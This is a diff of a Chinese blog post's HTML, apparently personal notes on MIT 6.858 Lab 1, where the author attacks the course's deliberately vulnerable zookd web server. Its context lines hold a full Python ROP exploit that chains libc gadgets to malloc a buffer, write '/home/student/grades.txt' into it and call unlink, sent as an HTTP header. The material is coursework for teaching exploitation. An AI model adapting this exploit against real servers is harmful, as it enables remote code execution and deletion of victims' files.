@@ -18,14 +18,14 @@
   
     <meta name="description" content="mit 计算机系统安全实验">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mit6858">
-<meta property="og:url" content="https://isolator-1.github.io/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858/index.html">
+<meta property="og:title" content="mit6858 Lab1">
+<meta property="og:url" content="https://isolator-1.github.io/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
 <meta property="og:description" content="mit 计算机系统安全实验">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://isolator-1.github.io/img/mit6858/1.jpg">
 <meta property="article:published_time" content="2023-12-06T02:30:00.000Z">
-<meta property="article:modified_time" content="2023-12-07T03:47:06.030Z">
+<meta property="article:modified_time" content="2023-12-07T07:41:03.497Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -35,7 +35,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>mit6858 - Isolator&#39;s Blog</title>
+  <title>mit6858 Lab1 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -214,7 +214,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="mit6858"></span>
+            <span id="subtitle" data-typed-text="mit6858 Lab1"></span>
           
         </div>
 
@@ -237,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.9k words
+          7.8k words
         
       </span>
     
@@ -286,21 +286,18 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">mit6858</h1>
+            <h1 style="display: none">mit6858 Lab1</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="mit-系统安全实验"><a href="#mit-系统安全实验" class="headerlink" title="mit 系统安全实验"></a>mit 系统安全实验</h2><p>参考自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">arttnba3大佬的博客</a>🐤</p>
-<p>地址 <a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html">https://css.csail.mit.edu/6.858/2022/labs/lab1.html</a></p>
+                <h2 id="mit-系统安全实验Lab1"><a href="#mit-系统安全实验Lab1" class="headerlink" title="mit 系统安全实验Lab1"></a>mit 系统安全实验Lab1</h2><p>参考自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">arttnba3大佬的博客</a>🐤</p>
+<p>地址 <a target="_blank" rel="noopener" href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html%EF%BC%88Lab1%E7%94%A8%E7%9A%842022%E5%B9%B4%E7%9A%84%E5%AE%9E%E9%AA%8C%EF%BC%89">https://css.csail.mit.edu/6.858/2022/labs/lab1.html（Lab1用的2022年的实验）</a></p>
 <p>给了一个虚拟机<a target="_blank" rel="noopener" href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">ubuntu 21.10</a>的vmdk，安装完之后是一个tty，发现没有net-tools，也不能从虚拟机外复制进来内容，去学习了一下发现<code>ip addr</code>也可以查看ip，不过这个输出有点多，这个虚拟机终端也没法往上滚动，加了一个grep 192.168就好了。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~$ ip addr | grep 192.168<br>    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0<br></code></pre></td></tr></table></figure>
 
 <p>然后就可以ssh了</p>
-<blockquote>
-<p>但是不知道为什么ubuntu21.10（代号impish）没法换源，好像阿里清华直接没有这个源，我又去ubuntu官方源试了一下，还是安装不了。是21.10不再支持了嘛？（不懂）</p>
-<p>最后直接用ubuntu20.04的源…目前还没啥问题</p>
-</blockquote>
+<p>但是ubuntu21.10已经没法apt install了（</p>
 <p>实验的内容在<code>git clone https://web.mit.edu/6858/2022/lab.git </code></p>
 <h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>按照说明，首先make一下，然后运行<code>./clean-env.sh ./zookd 8080</code></p>
 <blockquote>
@@ -366,6 +363,7 @@
 <p>但是我看了一下大佬的exp，（假设未知value和retaddr），用malloc分配一段地址，靠rax加偏移量去内容的指令完成写入字符串，然后把rax放到rdi里，调用unlink。</p>
 <p>但是在我的libc里，向chunk写入字符串倒是能找到gadget，但是没法把rax挪到rdi里。找不到以rax为src，以任何一个寄存器（非取内容）为dst的<code>mov</code>指令，也找不到形如<code>pop_rax_push_xxx_ret</code>的东西。寄了（</p>
 <p><del>我不李姐为什么同一个vmdk创建的虚拟机libc内容不一样？真不懂😭</del></p>
+<p>对不起，看到lab2才发现他没用给的虚拟机</p>
 <p>虽然但是，还是摆在这学习一下吧</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_malicious_request</span>():<br>    e = ELF(<span class="hljs-string">&#x27;./zookd-nxstack&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    <br>    pop_rdi_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()<br>    pop_rdx_pop_rbx_ret = libc_base + <span class="hljs-number">0x11f497</span> <span class="hljs-comment"># &#x27;pop rdx ; ret&#x27; by search can&#x27;t be used</span><br>    pop_rcx_ret = libc_base + libc.search(asm(<span class="hljs-string">&#x27;pop rcx ; ret&#x27;</span>)).__next__()<br>    ret = pop_rdi_ret + <span class="hljs-number">1</span><br>    copy_gadget = libc_base + <span class="hljs-number">0xc5163</span> <span class="hljs-comment"># mov qword ptr [rax + rdx - 8], rdi ; ret</span><br>    push_rax_pop_rbx_ret = libc_base + <span class="hljs-number">0x1750eb</span><br>    mov_rdi_rbx_call_rcx = libc_base + <span class="hljs-number">0x15e9d8</span><br>   <br>    func_malloc = libc_base + libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>    func_unlink = libc_base + libc.sym[<span class="hljs-string">&#x27;unlink&#x27;</span>]<br>    <span class="hljs-comment"># ret for slide</span><br>    payload  = <span class="hljs-number">512</span> * p64(ret)<br>    <span class="hljs-comment"># alloc a chunk to store the string</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x100</span>) + p64(func_malloc)<br>    <span class="hljs-comment"># copy string to chunk</span><br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x74732f656d6f682f</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x72672f746e656475</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0x7478742e73656461</span>) + p64(copy_gadget)<br>    payload += p64(pop_rdx_pop_rbx_ret) + p64(<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;arttnba3&#x27;</span><br>    payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(copy_gadget)<br>    <span class="hljs-comment"># call unlink(chunk)</span><br>    payload += p64(pop_rcx_ret) + p64(func_unlink)<br>    payload += p64(push_rax_pop_rbx_ret)<br>    payload += p64(mov_rdi_rbx_call_rcx)<br>    <span class="hljs-comment"># url encoding</span><br>    payload = payload.replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure>
 
@@ -423,8 +421,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>mit6858</div>
-      <div>https://isolator-1.github.io/2023/12/06/学习笔记/mit6858/</div>
+      <div>mit6858 Lab1</div>
+      <div>https://isolator-1.github.io/2023/12/06/学习笔记/mit6858Lab1/</div>
     </div>
     <div class="license-meta">
       
@@ -467,6 +465,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/" title="乱七八糟的知识">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">乱七八糟的知识</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
